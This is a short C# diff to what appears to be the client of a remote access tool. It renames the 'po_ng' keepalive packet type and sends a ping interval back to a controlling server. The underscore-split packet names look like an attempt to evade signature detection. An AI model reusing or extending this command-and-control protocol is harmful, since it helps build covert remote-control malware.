@@ -291,11 +291,11 @@ namespace Client.Connection
                 unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                 {
-                    case "po_ng": //send interval value to server
+                    case "Po_ng": //send interval value to server
                         {
                             ClientSocket.ActivatePo_ng = false;
                             MsgPack msgPack = new MsgPack();
-                            msgPack.ForcePathObject("Pac_ket").SetAsString("po_ng");
+                            msgPack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
                             msgPack.ForcePathObject("Message").SetAsInteger(ClientSocket.Interval);
                             ClientSocket.Send(msgPack.Encode2Bytes());
                             ClientSocket.Interval = 0;
